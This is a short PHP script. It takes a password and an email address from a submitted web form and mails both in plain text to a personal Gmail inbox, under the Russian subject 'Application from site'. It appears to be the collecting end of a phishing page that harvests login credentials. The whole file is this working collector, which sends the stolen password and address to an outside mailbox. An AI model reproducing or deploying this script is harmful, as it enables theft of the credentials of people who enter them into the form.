<?php

$pwd = $_POST['pwd'];

$email = $_POST['email'];

$pwd = htmlspecialchars($pwd);

$email = htmlspecialchars($email);

$pwd = urldecode($pwd);

$email = urldecode($email);

$pwd = trim($pwd);

$email = trim($email);

if (mail("nikitings1673@gmail.com", "Заявка с сайта", "Пароль:".$pwd.". E-mail: ".$email ,"From: info@nikitings.github.io \r\n"))
 {     echo "сообщение успешно отправлено";
} else {
    echo "при отправке сообщения возникла ошибка";
}?>